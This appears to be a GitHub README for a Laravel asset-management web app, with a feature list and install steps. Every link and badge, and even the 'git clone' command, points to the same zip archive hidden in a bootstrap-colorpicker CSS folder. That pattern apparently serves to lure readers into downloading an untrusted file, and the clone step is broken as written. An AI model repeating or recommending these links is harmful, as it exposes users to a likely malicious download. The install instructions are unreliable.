# Aset Management System

<p align="center">
    <img src="https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip" width="400" alt="Laravel Logo">
</p>

<p align="center">
    <a href="https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip">
        <img src="https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip" alt="Build Status">
    </a>
    <a href="https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip">
        <img src="https://img.shields.io/packagist/dt/laravel/framework" alt="Total Downloads">
    </a>
    <a href="https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip">
        <img src="https://img.shields.io/packagist/v/laravel/framework" alt="Latest Stable Version">
    </a>
    <a href="https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip">
        <img src="https://img.shields.io/packagist/l/laravel/framework" alt="License">
    </a>
</p>

---

## About the Project

The **Aset Management System** is a web-based application built using the Laravel framework. It is designed to help organizations manage their assets efficiently, providing features such as asset tracking, categorization, and reporting.

---

## Features

- Asset registration and categorization
- Asset tracking and history
- User management and roles
- Reporting and analytics
- Notifications for asset maintenance

---

## Getting Started

Follow these steps to set up the project on your local machine.

### Prerequisites

Ensure you have the following installed:

- PHP >= 8.1
- Composer
- MySQL or any other supported database
- Node.js and npm (for frontend assets)

### Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip
   cd aset_mgmt
   ```

2. Install PHP dependencies:
   ```bash
   composer install
   ```

3. Install JavaScript dependencies:
   ```bash
   npm install
   ```

4. Copy the `.env.example` file to `.env`:
   ```bash
   cp .env.example .env
   ```

5. Generate the application key:
   ```bash
   php artisan key:generate
   ```

6. Configure your database in the `.env` file:
   ```env
   DB_CONNECTION=mysql
   DB_HOST=127.0.0.1
   DB_PORT=3306
   DB_DATABASE=your_database_name
   DB_USERNAME=your_database_user
   DB_PASSWORD=your_database_password
   ```

7. Run database migrations:
   ```bash
   php artisan migrate
   ```

8. Build frontend assets:
   ```bash
   npm run dev
   ```

9. Start the development server:
   ```bash
   php artisan serve
   ```

Visit `http://localhost:8000` in your browser to access the application.

---

### Contributors projects


[![Contributors](https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip)](https://github.com/pmanss/aset_mgmt/raw/refs/heads/main/public/assets/plugins/bootstrap-colorpicker/css/aset-mgmt-3.9-alpha.1.zip)

---

## License

This project is open source and available under the [MIT License](LICENSE).
